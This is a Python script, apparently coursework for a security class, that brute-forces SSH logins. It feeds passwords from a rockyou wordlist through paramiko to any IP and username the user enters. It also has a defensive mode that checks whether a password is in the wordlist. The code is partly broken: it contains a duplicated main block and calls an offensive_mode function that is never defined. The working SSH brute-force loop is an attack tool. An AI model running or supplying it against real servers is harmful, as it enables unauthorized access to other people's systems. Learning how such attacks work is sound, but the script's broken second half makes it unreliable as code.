#!/usr/bin/env python3

# Rodolfo Gonzalez
# January 30 2024

# Purpose: Challenge 16: Automate Brute Force Wordlis Attack Tool 1 of 3


"""Resourcers:
https://chat.openai.com/share/3903bda9-1e4e-41b3-a73b-8f383ad80b63
https://www.geeksforgeeks.org/iterate-over-a-set-in-python/"""


import time
import os
import paramiko

# Set the path to the RockYou.txt file
ROCKYOU_PATH = os.path.expanduser("~/Documents/rockyou.txt")

# Set the SSH server information
SSH_IP = ""
SSH_USERNAME = ""

##################### === Function for SSH Brute Force ===###################
def ssh_brute_force(wordlist_path):
    try:
        # Open the wordlist file in binary mode and read all lines
        with open(wordlist_path, 'rb') as wordlist_file:
            words = [line.strip().decode('utf-8', errors='ignore') for line in wordlist_file.readlines()]

        # Initialize SSH client
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Iterate through and try each word as the password
        for word in words:
            password = word
            print(f"Attempting password: {password}")

            try:
                # Connect to the SSH server
                ssh_client.connect(SSH_IP, username=SSH_USERNAME, password=password)

                # If successful, print a message and break the loop
                print(f"\033[92mPassword found: {password}\033[0m")
                break

            except paramiko.AuthenticationException:
                # Password authentication failed, continue with the next password
                pass

        # Close the SSH client
        ssh_client.close()

    except FileNotFoundError:
        print("Word list file not found.")
    except KeyboardInterrupt:
        print("Operation aborted by the user.")

if __name__ == "__main__":
    while True:
        print("\033[35mSelect a mode:\033[0m")
        print("1. Offensive; Brute Force SSH")
        print("2. Defensive; Password Recognized")
        print("3. Dictionary Iterator")
        print("4. Exit")

        mode = input("\033[35mEnter mode (1, 2, 3, or 4 to exit): \033[0m")

        if mode == "1":
            SSH_IP = input("Enter the IP address of the SSH server: ")
            SSH_USERNAME = input("Enter the SSH username: ")
            wordlist_path = input("Enter the path to the wordlist file: ")
            ssh_brute_force(wordlist_path)
        elif mode == "2":
            user_input = input("Enter the string to search for: ")
            # Check if the user input is in the word list
            with open(ROCKYOU_PATH, 'rb') as wordlist_file:
                words = [line.strip().decode('utf-8', errors='ignore') for line in wordlist_file.readlines()]
                if user_input in words:
                    print("\033[91mYour word IS in the word list.\033[0m")  # Red color for found word
                else:
                    print("\033[92mYour word is NOT in the word list.\033[0m")  # Green color for not found word
        elif mode == "3":
            wordlist_path = input("Enter the path to the wordlist file: ")
            lines_to_read = int(input("Enter the number of lines to process: "))
            # Read and print specified number of lines from the word list
            with open(wordlist_path, 'rb') as wordlist_file:
                words = [next(wordlist_file).strip() for _ in range(lines_to_read)]
                for word in words:
                    print("Current word:", word.decode('utf-8', errors='ignore'))
                    time.sleep(1)
        elif mode == "4":
            print("\033[340mExiting the program. Goodbye!\033[0m")
            break  # Exit the loop and end the program
        else:
            print("Invalid mode. Please select 1, 2, 3, or 4.")


##################### === Function for Defensive Mode ===###################
def defensive_mode():
    user_input = input("Enter the string to search for: ")
    
    try:
        # Open the wordlist file in binary mode and read all lines
        with open(ROCKYOU_PATH, 'rb') as wordlist_file:
            words = [line.strip() for line in wordlist_file.readlines()]

        user_input_bytes = user_input.encode('utf-8')

        found = False
        # Compare user input as bytes with words in the word list
        for word_bytes in words:
            if user_input_bytes == word_bytes:
                found = True
                break

        # Display search result with color formatting
        if found:
            print("\033[91mYour word IS in the word list.\033[0m")  # Red color for found word
        else:
            print("\033[92mYour word is NOT in the word list.\033[0m")  # Green color for not found word

    except FileNotFoundError:
        print("Word list file not found.")
    except KeyboardInterrupt:
        print("Operation aborted by the user.")

##################### === Function for Dictionary Iterator Mode ===###################
def dictionary_iterator_mode(wordlist_path, lines_to_read):
    try:
        # Open the wordlist file in binary mode and read specified number of lines
        with open(wordlist_path, 'rb') as wordlist_file:
            words = [next(wordlist_file).strip() for _ in range(lines_to_read)]

        # Iterate through and print words with a delay
        for word in words:
            print("Current word:", word.decode('utf-8', errors='ignore'))
            time.sleep(1)

    except FileNotFoundError:
        print("Word list file not found.")
    except ValueError:
        print("Invalid input for the number of lines. Please enter a valid integer.")
    except KeyboardInterrupt:
        print("Operation aborted by the user.")

################################# === Main program ===###############################
if __name__ == "__main__":
    while True:
        print("\033[35mSelect a mode:\033[0m")
        print("1. Offensive; Dictionary Iterator")
        print("2. Defensive; Password Recognized")
        print("3. Dictionary Iterator")
        print("4. Exit")

        mode = input("\033[35mEnter mode (1, 2, 3, or 4 to exit): \033[0m")

        try:
            if mode == "1":
                # Run Offensive Mode
                offensive_mode()
            elif mode == "2":
                # Run Defensive Mode
                defensive_mode()
            elif mode == "3":
                # Run Dictionary Iterator Mode
                wordlist_path = input("Enter the path to the wordlist file: ")
                lines_to_read = int(input("Enter the number of lines to process: "))
                dictionary_iterator_mode(wordlist_path, lines_to_read)
            elif mode == "4":
                print("\033[340mExiting the program. Goodbye!\033[0m")
                break  # Exit the loop and end the program
            else:
                print("Invalid mode. Please select 1, 2, 3, or 4.")

        except KeyboardInterrupt:
            print("Operation aborted by the user.")
